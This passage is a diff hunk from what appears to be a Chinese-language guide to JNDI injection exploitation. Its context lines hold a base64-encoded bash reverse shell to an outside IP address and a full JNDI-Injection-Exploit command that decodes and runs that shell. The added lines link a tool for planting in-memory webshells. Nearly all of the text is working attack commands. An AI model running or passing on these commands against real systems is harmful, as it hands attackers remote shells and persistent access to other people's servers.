@@ -101,3 +101,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==（这是上一行�
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}" -A "（你服务器的公网IP地址）"
 ```
 
+
+^
+可以注入内存马的最新版工具：
+<https://github.com/wyzxxz/jndi_tool>
